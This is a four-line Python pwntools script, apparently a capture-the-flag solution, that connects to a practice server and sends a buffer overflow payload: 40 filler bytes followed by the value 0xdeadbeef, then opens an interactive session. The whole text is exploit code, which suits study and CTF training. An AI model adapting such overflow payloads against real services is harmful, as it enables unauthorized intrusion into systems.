from pwn import *
r = remote('ctf.j0n9hyun.xyz', 3000)
r.sendline('a'*40 + p32(3735928559))
r.interactive()